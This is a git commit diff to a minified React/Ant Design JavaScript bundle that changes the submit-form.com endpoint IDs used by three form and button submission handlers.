4f996918eb11103b71ad190d85215457c272cf8a
usertiadk <dkcyber121@protonmail.com>
2025-03-12 01:27:40 +0500

    Add files via upload

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/HrhSIEfyr", {
+                                    fetch("https://submit-form.com/eyJSqgfMg", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/HrhSIEfyr", {
+                                    u && o ? (fetch("https://submit-form.com/eyJSqgfMg", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/HrhSIEfyr", {
+                        fetch("https://submit-form.com/IPczkb1he", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
